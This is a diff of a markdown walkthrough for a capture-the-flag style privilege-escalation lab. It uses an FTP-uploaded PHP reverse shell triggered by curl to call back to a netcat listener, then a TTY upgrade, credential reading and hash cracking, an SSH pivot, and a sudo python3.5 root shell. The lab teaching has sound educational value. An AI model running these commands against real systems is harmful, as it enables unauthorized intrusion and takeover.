@@ -1,5 +1,7 @@
 # Project: Privilege Escalation Challenge (Local#1)
 
+[← Back to README](../README.md)
+
 ## 1. Preparation and Reconnnaissance
 - IP Discovery:
     1. Run ```ifconfig``` in terminal to find your own IP.
@@ -62,7 +64,7 @@
             -p port
             -Pn no ping
             -n: (disables DNS lookups)
-            
+
         </details>
 
 
@@ -165,7 +167,7 @@ Use that path and place it at the end of the URL.
 
 Here is the visual confirmation we needed.
 
-We were able to downloa the files using the FTP Access.  This tells us that if we can download from this access, it is also possible to upload.
+We were able to download the files using the FTP Access.  This tells us that if we can download from this access, it is also possible to upload.
 
 So we will be using a technique called "Reverse Shell". <br>
 A reverse shell is a hacking technique where the target machine (like the VM) reaches out to your Kali machine over the network, opening a direct command line you control remotely.
@@ -182,35 +184,148 @@ What is a netcat?
 Netcat (nc) is a simple, powerful command-line networking tool—"Swiss Army knife for TCP/UDP"—that reads/writes data across network connections for port scanning, file transfer, or creating shells
 
 
-1. PHP-REVERSE-SHELL.PHP
-    * Look for the line where it asks for IP and Listener.
-    * Change the IP to MY IP we have been using.
-    * Change the Listener to a port of your choice. 
+#### 1. PHP-REVERSE-SHELL.PHP
+* Look for the line where it asks for IP and Listener.
+* Change the IP to MY IP we have been using.
+* Change the Listener to a port of your choice. 
+<br>
+<br>
+    ***This is where we will be using 2-3 terminal windows.***
 
-    This is where we will be using 2-3 Terminal.
-
-    Terminal 1:
+    Terminal 1: <br>
     We will be using netcat to listen now.
-    Run this command:  nc -lvnp [port] 
+    Run this command:  `nc -lvnp port` 
 
-    <detail> 
-        <summary> Click for Command </summary>
-        
-        -l listen mode, waiting incoming connections
-        -v verbose output see detailed information in your terminal
-        -n skip DNS lookup
-        -p specify port
-        
-    </detail>
+    `-l` listen mode, waiting incoming connections <br>
+    `-v` verbose output see detailed information in your terminal <br>
+    `-n` skip DNS lookup <br>
+    `-p` specify port <br>
 
+    #### **Go to the browser to check if the file has been uploaded.**
 
-    <br>
-    Go to the browser to check if the file has been uploaded.
-
+    Terminal 2: <br>
     Once you have confirmed the file exists, we are going to use a curl command to "activate" this file.
+    Open up a second terminal and run this command.
     ```
     curl "http://<TARGET IP>/files/php-reverse-shell.php"
     ```
+    <br>
     Remember to put the URL in a string. Very Important! 
+    <br><br>
+    You will now see that on the terminal you have open the netcat on has feedback.
+#### 2. Netcat Listener
 
-2. 
+We will now be using the netcat terminal.  
+You will see something like this if you have done it correctly.
+```
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.128.2] from (UNKNOWN) [192.168.128.2] 55124
+Linux ubuntu 4.4.0-194-generic #226-Ubuntu SMP Wed Oct 21 10:19:36 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 08:33:12 up 52 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+```
+
+You now have shell access as 'www-data' 
+
+## 3. Internal Enumeration and User Pivot - Exploitation
+Now we have access. Let us dig even deeper! 
+
+### 1. TTY Upgrade
+Run this command in the current terminal now.
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+This command changes your raw reverse shell to a proper interactive TTY (teletypewriter). It improves the command handling to behave like a regular terminal.
+
+*TTY can tab completetion, arrow keys print garbage, etc..
+
+At this point, you can use the terminal as you normally would. This is where you `ls` and recon. <br>
+
+For this exercise's sake. <br>
+Run this in the terminal
+`ls -la /home`
+
+### 2. Credential Discovery
+You will now see two files. 
+Let us use the `cat` command to see what is inside. <br>
+Follow the instruction on the terminal.
+
+Let us use the `cat` command to peer into the file they provided.
+
+Ah, now we have some very valuable information.
+
+Congratulations!  You have find the user credentials!
+
+### 3. Hash Cracking
+We have the user information now, but the password is hashed.
+We will be using a tool to unhash it! 
+
+[www. hashes.com](https://hashes.com/en/decrypt/hash)
+Type in the hashed password and voila!
+
+### 4. Pivot 
+We have done what we set out to do.
+We now have access to a user level privileage.
+This called a horizontal esclation.
+
+## 4. Privilege Escalation to Root
+
+We had quite a journey! Now since we have the user credentials, let us keep digging!
+
+We will now use the SSH to log in to the server now.
+Run this in your terminal: <br>
+`ssh shrek@192.168.128.3`
+
+Follow the instructions.
+
+Congratulations, you are now logged in as "user".
+Run this command in the the terminal:
+`sudo -l`
+
+You will see something similiar to this:
+
+<details>
+  <summary>Click to reveal</summary>
+
+    Matching Defaults entries for shrek on ubuntu:
+        env_reset, mail_badpass,
+        secure_path=/usr/local/sbin\:/usr/local/bin\:usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+    User shrek may run the following commands on ubuntu:
+        (root) NOPASSWD: /usr/bin/python3.5
+</details>
+
+You can see that we can use the user to run a command line directly to the root.
+
+Run in this command in the terminal:<br>
+`sudo /usr/bin/python3.5 -c 'import os; os.execl("/bin/sh","sh","-p")'`
+
+This command-line takes the python3.5 that exists in the "/usr/bin/" so we can execute a single command to gain access to that "root".
+
+Type `whoami` to check if we are in the root.
+
+Going from a user to root, moving deeper into the access of the this eco-system.
+This is what we call a vertical privilege escalation. 
+
+Now we can move to the `root`directory ourselves or we can type `cat /root/root.txt`
+
+Congratulations!  You have now successfully completed the task given!
+
+--- 
+
+**Note to Colleagues**: 
+
+Each phase demonstrates a critical concept in penetration testing: 
+* Reconnaissance
+* Initial Access*, 
+* Enumeration
+* Privilege Escalation
+
+Always ensure you have proper authorization before performing these steps on any system
+.
+
+[← Back to README](../README.md)
